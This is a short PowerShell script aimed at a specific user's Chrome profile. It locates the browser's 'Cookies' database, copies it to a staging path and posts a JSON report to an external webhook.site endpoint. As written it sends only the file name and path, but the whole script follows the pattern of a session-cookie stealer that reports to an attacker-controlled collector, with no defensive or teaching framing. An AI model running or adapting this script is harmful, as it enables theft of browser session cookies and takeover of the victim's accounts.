# Define the target directory
$targetDirectory = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data"

# Define the file name to search for
$fileName = "Cookies"

# Navigate to the target directory
Set-Location -Path $targetDirectory

# Search for the file
$file = Get-ChildItem -Recurse | Where-Object { $_.Name -eq $fileName }

# Check if the file was found
if ($file -ne $null) {
    # Assuming you want to copy the file to a specific location before sending
    $destinationPath = "C:\Path\To\Copy\File\$fileName"
    Copy-Item -Path $file.FullName -Destination $destinationPath

    # Preparing data for sending to a webhook (hypothetically)
    $uri = "https://webhook.site/e133adb0-4321-413a-aff1-7e0495c990cc"
    $body = @{
        FileName = $fileName
        FilePath = $destinationPath
    } | ConvertTo-Json

    # Send data to the webhook server
    Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
} else {
    Write-Output "File $fileName not found."
}

